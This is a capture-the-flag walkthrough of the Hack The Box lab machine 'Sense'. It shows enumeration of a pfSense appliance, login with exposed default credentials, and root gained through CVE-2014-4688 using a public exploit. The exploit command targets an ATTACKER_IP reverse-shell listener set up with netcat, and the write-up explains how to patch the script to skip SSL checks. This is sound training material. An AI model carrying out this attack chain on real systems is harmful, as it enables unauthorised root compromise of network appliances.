## Welcome everyone!

Today, we will explore “*Sense*”, an easy-rated machine on **Hack The Box**.

Without further ado, let’s get started!

![image](/HTB/Sense/Sense_images/1.png)

(Please ensure that you have added the following line   `sense.htb     TARGET.IP`   to your `/etc/hosts` file to enable **DNS resolution**)

## Information Gathering

First, we will perform an aggressive **Nmap** scan to gather as much information as possible about the system we’re targeting:

![image](/HTB/Sense/Sense_images/2.png)

Two services appear to be running on the target:

**HTTP** (Port 80)

**HTTPS** (Port 443)

We can start by inspecting the web site hosted on port **80**:

![image](/HTB/Sense/Sense_images/3.png)

We are greeted with a login panel which appears to protect a web application dashboard. Since we don’t have valid credentials, we can’t access it. Looking at the page source code, we can identify the web application under this login panel: ***pfSense**.*

![image](/HTB/Sense/Sense_images/4.png)

Since we don’t have valid credentials, we can’t do much there. We will perform web directory fuzzing using **Gobuster** in order to identify any useful authentication-related resource. For compatibility, we will target the HTTPS service (Port 443), so we need to add the `-k` switch to avoid certificate issues:

![image](/HTB/Sense/Sense_images/5.png)

We can identify multiple accessible files, but most of them make a redirect to the login panel previously discovered. Let’s inspect the `changelog.txt` file:

![image](/HTB/Sense/Sense_images/6.png)

We can learn from the file that a vulnerability is still remaining on the target web application, interesting.

Let’s inspect the intriguing `system-users.txt` file:

![image](/HTB/Sense/Sense_images/7.png)

A valid username has been discovered: **Rohit**. The password appears to be the default web application password. Performing some research reveals that `pfsense` is the default password:

![image](/HTB/Sense/Sense_images/8.png)

Getting back to the login panel, let’s attempt to authenticate ourselves using these credentials:

`rohit:pfsense`

![image](/HTB/Sense/Sense_images/9.png)

![image](/HTB/Sense/Sense_images/10.png)

It works! We successfully accessed the dashboard.
a few pieces of information are revelated. We can identify the valued **v2.1.3** version associated to the web application targeted. We can attempt to research potential vulnerabilities affecting it:

![image](/HTB/Sense/Sense_images/11.png)

It appears that a vulnerability affecting pfSense up to **v2.1.4** exists: **CVE-2014-4688**. Since the target has left its pfSense web application unpatched, we could attempt to leverage this vulnerability to obtain our foothold on the system through an authenticated remote code execution.

 Exploit-DB hosts a **Python script** (You can find it here) that exploits the vulnerability in question.  Let’s execute the Python script with the `-h` switch to obtain more information about its usage:

![image](/HTB/Sense/Sense_images/12.png)

It appears that we need to provide the target IP, our local IP, the listening port to receive the reverse shell, and valid credentials. We could attempt to launch the exploit through the following command:

`python3 43560.py --rhost TARGET_IP --lhost ATTACKER_IP --lport NC_PORT --username rohit --password pfsense`  

(ensure that you have set up a **Netcat listener** through `nc -lvnp PORT` in order to catch the connection)

WARNING: In my testing, the exploit only worked when using the target IP address (not domain name).

And… we get an error:

![image](/HTB/Sense/Sense_images/13.png)

An SSL certificate verification attempt is established during the script execution, and it appears that it won’t work. To prevent the script to verify HTTPS certificate, we need to add the following code line below the `client = requests.session()` line:

`client.verify = False`

This allows us to disable the SSL certificate verification, thus, executing the payload against the target.

![image](/HTB/Sense/Sense_images/14.png)

We will run the script once again:

![image](/HTB/Sense/Sense_images/15.png)

It worked! We successfully gained our initial access. Moreover, we gained root access, which means that the machine is already fully compromised. We are now able to retrieve the both flags:

![image](/HTB/Sense/Sense_images/16.png)

Challenge completed!

![image](/HTB/Sense/Sense_images/17.png)

## Conclusion

To conclude, **Sense** was a great example of how a relatively simple attack chain can lead to a complete system compromise. By combining **Nmap enumeration**, **web directory fuzzing**, information disclosure through exposed files, and the discovery of default credentials, we were able to gain authenticated access to the **pfSense** dashboard.

From there, identifying the outdated **pfSense v2.1.3** version allowed us to discover **CVE-2014-4688**, an authenticated command injection vulnerability affecting the `status_rrd_graph_img.php` endpoint. After adapting the public exploit to bypass the target’s self-signed SSL certificate, we successfully obtained a **root shell**, resulting in full compromise of the machine.

This machine highlights the importance of **keeping network appliances patched, removing sensitive files from publicly accessible directories, and changing default credentials**. From an offensive security perspective, it also demonstrates how seemingly minor information disclosures can be chained together to achieve complete system compromise very fastly.


**Thank you for reading!**
